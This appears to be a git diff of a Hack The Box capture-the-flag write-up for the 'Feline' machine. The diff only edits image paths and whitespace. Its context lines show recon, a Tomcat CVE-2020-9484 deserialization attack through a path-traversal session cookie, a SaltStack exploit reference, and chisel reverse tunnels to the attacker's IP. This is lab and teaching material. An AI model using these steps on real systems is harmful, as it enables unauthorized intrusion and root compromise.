@@ -9,12 +9,12 @@ published: true
 
 ## 0x0 Introduction
 The first **hard** box that I have ever pwned, so lets dive right into it. This box involved a java deserialization attack to first get an inital foothold, once we are on it we use a known exploit in `saltstack` to become root of docker container, now you might wonder: Why would we want to become root of a docker-container? Well this docker container also had a miss configuration issue which then allowed us to mount files from the host system, such as the root.txt, into the container.
-![image](/assets/images/feline/feline-pwn.png "Feline has been pwned")
+![image](/images/feline/feline-pwn.png "Feline has been pwned")
 
 
 ## 0x1 How not to handle error messages
 
-As always I start with an nmap scan, 
+As always I start with an nmap scan,
 
 ```
 $ nmap -sC -sV -oN recon/nmap-default 10.10.10.205
@@ -24,7 +24,7 @@ Host is up (0.39s latency).
 Not shown: 998 closed ports
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
 |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
 |_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
@@ -35,28 +35,28 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 
-if we look at the website, running on port 8080, we see that this is some kind of malware analysis engine, called Virusbucket, and that we can upload files. 
+if we look at the website, running on port 8080, we see that this is some kind of malware analysis engine, called Virusbucket, and that we can upload files.
 
-![image](/assets/images/feline/feline-virusbucket.png "Feline Virusbucket")
+![image](/images/feline/feline-virusbucket.png "Feline Virusbucket")
 
 if we capture the HTTP request for the file-upload, you can use a proxy like burp or ZAP for this, then you will see this:
 
-![image](/assets/images/feline/feline-file-upload.png "Feline Upload")
+![image](/images/feline/feline-file-upload.png "Feline Upload")
 
 But if we replace the filename here with some nonsense, then we can error from the application in which it leaks the location that our files are being upload to:
 
-![image](/assets/images/feline/feline-upload-error.png "Feline Upload Error")
+![image](/images/feline/feline-upload-error.png "Feline Upload Error")
 
 Which is some really useful information because if we can find a way to interact with the files that we have uploaded, through a tomcat vulnerability for example, then we need to know where to look for our uploaded files.
 
 ## 0x2 Cuz there is always a tomcat vulnerability
 
-Since it's tomcat and we now that it's version 9.0.27 I, like most people solving this box probably, looked for a vulnerability in that found this blogpost: https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/ and the CVE in question is: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9484.  
-If you are solving this box after it has retired and are following along with this post of mine I highly suggest that you go and read the "redtimmy" post, it was well written and to the point. 
-The whole point of this exploit is that, if we can get a serialized object on the disk, which we can by simply uploading it, we can use a path traversal vulnerability in the Session-Cookie to get tomcat to deserialize it, which in turn can give us code execution on the box.  
-Since we know that our upload files go to `/opt/samples/uploads/` we can set our `JSESSIONID` to `../../../../../../../opt/samples/uploads/the-file-that-we-have-uploaded`  
-To create such a serailized object we use `ysoserial` which you can find here: https://github.com/frohoff/ysoserial  
-The error message of the File upload had also told us that this uses apache.org.commons which is a libarry for all sorts of common deserializations. Knowing that we can use `ysoserial` with the `CommonCollections4`.  
+Since it's tomcat and we now that it's version 9.0.27 I, like most people solving this box probably, looked for a vulnerability in that found this blogpost: https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/ and the CVE in question is: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9484.
+If you are solving this box after it has retired and are following along with this post of mine I highly suggest that you go and read the "redtimmy" post, it was well written and to the point.
+The whole point of this exploit is that, if we can get a serialized object on the disk, which we can by simply uploading it, we can use a path traversal vulnerability in the Session-Cookie to get tomcat to deserialize it, which in turn can give us code execution on the box.
+Since we know that our upload files go to `/opt/samples/uploads/` we can set our `JSESSIONID` to `../../../../../../../opt/samples/uploads/the-file-that-we-have-uploaded`
+To create such a serailized object we use `ysoserial` which you can find here: https://github.com/frohoff/ysoserial
+The error message of the File upload had also told us that this uses apache.org.commons which is a libarry for all sorts of common deserializations. Knowing that we can use `ysoserial` with the `CommonCollections4`.
 
 First we create our reverse shell command and encode it with base64 to avoid spacing errors
 
@@ -89,12 +89,12 @@ curl 'http://10.10.10.205:8080/upload.jsp' -H "Cookie: JSESSIONID=../../../../..
 
 ## 0x3 Why so salty?
 
-Now that we are on the host we discover that port 4005 and 4006 are open, these ports are, by default, used by saltstack. Saltstack is an infrastructure management software but for this box we don't need to know much about how it acctually works. What we do need to know though is that there was a very recent vulnerabily in it. If you wanna read more details about the vulnerability you can go here: https://www.helpnetsecurity.com/2020/05/04/saltstack-salt-vulnerabilities/  
-Otherwise we are going straight to the exploit which can be found here: https://www.exploit-db.com/exploits/48421  
-If we are gonna try to run this on the victim maschine we are going to run into an issue, which is that the `salt` python module is not installed on the box. 
+Now that we are on the host we discover that port 4005 and 4006 are open, these ports are, by default, used by saltstack. Saltstack is an infrastructure management software but for this box we don't need to know much about how it acctually works. What we do need to know though is that there was a very recent vulnerabily in it. If you wanna read more details about the vulnerability you can go here: https://www.helpnetsecurity.com/2020/05/04/saltstack-salt-vulnerabilities/
+Otherwise we are going straight to the exploit which can be found here: https://www.exploit-db.com/exploits/48421
+If we are gonna try to run this on the victim maschine we are going to run into an issue, which is that the `salt` python module is not installed on the box.
 
 ```
-$ python3 exploit.py 
+$ python3 exploit.py
 Traceback (most recent call last):
   File "exploit.py", line 16, in <module>
     import salt
@@ -103,7 +103,7 @@ ModuleNotFoundError: No module named 'salt'
 
 ## 0x4 Port forwarding to the rescue
 
-So since the saltstack ports are on only listening on localhost, we cannot use the exploit from our box directly but since we are already on the box we can use a programm called `chisel` to do port forwarding and thus make the saltstack accessible from our host maschine.  
+So since the saltstack ports are on only listening on localhost, we cannot use the exploit from our box directly but since we are already on the box we can use a programm called `chisel` to do port forwarding and thus make the saltstack accessible from our host maschine.
 First, to get chisel on the victim maschine, go download it from https://github.com/jpillora/chisel/releases and then you can simply use the python http server to transfer it to the box.
 
 ```
@@ -122,7 +122,7 @@ Now we forward some ports as follows:
 ./chisel client 10.10.16.11:5566 R:4506:127.0.0.1:4506
 ```
 
-and 
+and
 
 ```
 ./chisel server -p 5566 --reverse
@@ -144,7 +144,7 @@ If everything has worked correctly here, we are `root`, yay! But it's still to e
 
 ## 0x5 The great docker escape
 
-The first thing I noticed inside this container was a file called "todo.txt" inside the home directroy of the root user 
+The first thing I noticed inside this container was a file called "todo.txt" inside the home directroy of the root user
 
 ```
 cat todo.txt
